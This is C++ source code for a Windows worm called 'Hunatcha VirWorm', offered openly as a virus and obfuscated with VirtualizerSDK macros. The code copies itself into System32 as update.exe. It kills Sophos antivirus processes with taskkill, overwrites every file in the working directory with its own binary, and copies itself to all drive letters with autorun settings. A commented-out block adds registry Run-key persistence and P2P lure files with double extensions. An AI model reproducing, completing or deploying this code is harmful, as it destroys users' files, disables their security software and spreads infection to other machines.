// hunatcha.cpp : Defines the entry point for the application.
//

//#include "stdafx.h"
//#include "hunatcha.h"
//#include "VirtualizerSDK.h"

#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;								// current instance
TCHAR szTitle[MAX_LOADSTRING];					// The title bar text
TCHAR szWindowClass[MAX_LOADSTRING];			// the main window class name

// Forward declarations of functions included in this code module:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

/*================================================================
   Undermine's Generic Hunatcha VirWorm 
   http://undermine.bloger.hr
  Your rights take full responsability of any  damage.
  The main reason for this virus is to show you how works,
  so this is why i added that variable. sorry for the mess but like i said 
  it's mostly to explain my virus.
  Peoples interessed in this technic should also rewrite DATA d32, in line  w32. 
  It also change register usage, but using a more advanced technic update taskkill.
==================================================================*/
//#include <windows.h>
#include <stdio.h>
#define PORT 21
#define VirSize	(2105+1)
#define LenID	(7+1)
const char *Inf_Drives[] = {"A:","B:","C:","D:","E:","F:","G:",
							"H:","I:","J:","K:","L:","M:","N:",
							"O:","P:","Q:","R:","S:","T:","U:",
							"V:","W:","X:","Y:","Z:",0};
/*
const char *Taskkill[] = {"av","Av","AV","defend","Defend","DEFEND",
							"f-","F-","defense","Defense","DEFENSE",
							"Kaspersky","KASPERSKY","kaspersky",
							"sophos","SOPHOS","Sophos","SAVAdminService.exe", "SavService.exe",
							"Scanner","SCANNER","scanner","Norton","norton","NORTON",
							"Security","SECURITY","security","Anti","ANTI","anti",
							"SCAN","Scan","scan","Malware","MALWARE","malware",
							"Virus","VIRUS","virus","NOD32","nod32","Nod32",
							"Zoner","ZONER","zoner","SECUR","Secur","secur","Dr.","DR.",0};
*/
const char *Taskkill[] = {"ALMon.exe","ALsvc.exe","swi_service.exe",
							"SAVAdminService.exe", "SavService.exe",0};
 
int InfectDrives(void);
int InfectFiles(void);
void FindDirectory(LPCSTR DirPath);
void FillArray(LPCSTR Directory);
 
char DirArray[250000][MAX_PATH];
int dircount = 0;
char windir[MAX_PATH];
HKEY hKey;
 
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 VIRTUALIZER_START
 int count;
 char wormpath[256];
 GetWindowsDirectory(windir, sizeof(windir));
 HMODULE hMe = GetModuleHandle(NULL);
 DWORD nRet = GetModuleFileName(hMe, wormpath, 256);
 HKEY hKey;
 strcat(windir, "\\System32\\update.exe");
 CopyFile(wormpath, windir, 0);
 /*
 RegCreateKey (HKEY_CURRENT_USER, "Software\\undermine", &hKey);
 RegSetValueEx (hKey, "Hunatcha", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\InternetRegistry",&hKey);
 RegSetValueEx (hKey, "Hunatcha", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\Undermine",&hKey);
 RegSetValueEx (hKey, "Explorer", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
 RegSetValueEx (hKey, "Hunatcha", 0, REG_SZ, (LPBYTE)windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Kazaa\\Transfer", &hKey);
 RegSetValueEx (hKey, "Upload", 0, REG_SZ, (LPBYTE)windir, sizeof(windir));
 
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\users_info.txt.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\video sister.avi.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\LimeWire\\gratis.mp4.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\LimeWire\\My Shared Folder\\info download.txt.exe", 0);
 CopyFile(wormpath, "C:\\Documents and Settings\\%user%\\My Documents\\Downloads\\upload.jpg.exe", 0);
 MessageBox (0, "Your system need to update my new world...", "Hunatcha Informer", MB_ICONINFORMATION | MB_OK);
 {
     count = count ^ 5;
 }
 */
 /* changes to for analysis and testing
 */
 NeverAntiVirus();
 /* end changes
 */

 VIRTUALIZER_END
 return 0;
}


DWORD FindProcessId(const char *processName)
{
	VIRTUALIZER_START
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if ( processesSnapshot == INVALID_HANDLE_VALUE )
		return 0;

	Process32First(processesSnapshot, &processInfo);
	//if ( !processName.compare(processInfo.szExeFile) )
	if( strcmp(processName, processInfo.szExeFile) == 0)
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while ( Process32Next(processesSnapshot, &processInfo) )
	{
		//if ( !processName.compare(processInfo.szExeFile) )
		if( strcmp(processInfo.szExeFile, processName) == 0)
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}
	
	CloseHandle(processesSnapshot);
	VIRTUALIZER_END
	return 0;
}

int NeverAntiVirus(void)
{
	VIRTUALIZER_START
	DWORD pid;
    HANDLE hProcess = NULL;
	
	int c;
	//while(1) {
		for(c=0;Taskkill[c]!=0;c++) { 
			
			//hProcess = FindProcess(Taskkill[c], dwId);
			//system((char *)&Taskkill[c]);
			pid = FindProcessId(Taskkill[c]);
			if(pid != 0) {
				char command[255] = {0};
				sprintf(command, "taskkill /F /PID %d", pid);
				
				system(command);
			}
		}
	VIRTUALIZER_END
	return 0;
}
int InfectDrives(void)
{
	VIRTUALIZER_START
	char IFile[256], NewFile[256], Autorun[256], InfFile[256];
	GetSystemDirectory(IFile,sizeof(IFile));
	strcat(IFile,"\\updater.exe");
	int i;
	while(1) {
		for(i = 0; Inf_Drives[i]; i++) {
			memset(NewFile,'\0',sizeof(NewFile));
			memset(Autorun,'\0',sizeof(Autorun));
			memset(InfFile,'\0',sizeof(InfFile));
			strcpy(NewFile,Inf_Drives[i]);
			strcpy(Autorun,Inf_Drives[i]);
			strcat(NewFile,"\\allow.exe");
			strcat(Autorun,"\\autorun.inf");
			if(CopyFile(IFile,NewFile,FALSE)) {
			//	FILE *runfile = fopen(Autorun,"wb");
				sprintf(InfFile,"[autorun]\r\nopen=allow.exe\r\naction=Open folder to view files\r\n");
			//	fputs(InfFile,runfile);
			//	fclose(runfile);
				SetFileAttributes(NewFile,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
				SetFileAttributes(Autorun,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
			}
		}
		Sleep(2000);
	}
	VIRTUALIZER_END
}
int InfectFiles(void)
{
	VIRTUALIZER_START
	WIN32_FIND_DATA w32;
	HANDLE fHandle;
	char MyFile[256];
	GetModuleFileName(NULL,MyFile,sizeof(MyFile));
	if((fHandle = FindFirstFile("*.*",&w32))==INVALID_HANDLE_VALUE) return 1;
	else {
		if(w32.cFileName==MyFile) goto next;
		SetFileAttributes(w32.cFileName,FILE_ATTRIBUTE_NORMAL);
		CopyFile(MyFile,w32.cFileName,FALSE);
        next:
		while(FindNextFile(fHandle,&w32)) {
			if(w32.cFileName==MyFile) continue;
			SetFileAttributes(w32.cFileName,FILE_ATTRIBUTE_NORMAL);
			CopyFile(MyFile,w32.cFileName,FALSE);
		}
		FindClose(fHandle);
	}
	VIRTUALIZER_END
	return 0;
}
void FindDirectory(LPCSTR DirPath)
{
	VIRTUALIZER_START
     WIN32_FIND_DATA FindData;
     HANDLE hFind;
     char Path[MAX_PATH];
     hFind = FindFirstFile(DirPath, &FindData);
     do
     {
         strcpy(Path, DirPath);
         Path[strlen(DirPath)-1] = 0;
         strcat(Path, FindData.cFileName);
 
         if ((FindData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY || FindData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_SYSTEM) && (strstr(FindData.cFileName,".")==0))
         {
           FillArray(Path);
           strcat(Path,"\\*");
           FindDirectory(Path);
         }
 
     } while (FindNextFile(hFind,&FindData));
     FindClose(hFind);
	 VIRTUALIZER_END
}
 
void FillArray(LPCSTR Directory)
{
	VIRTUALIZER_START
     lstrcpy(DirArray[dircount],Directory);
     dircount++;
	 VIRTUALIZER_END
}
void p2p_spread(void)
{
	VIRTUALIZER_START
	char wormpath[MAX_PATH];
	GetModuleFileName(NULL, wormpath, MAX_PATH);
	strcat(windir, "\\System32\\update.exe");
	VIRTUALIZER_END
}

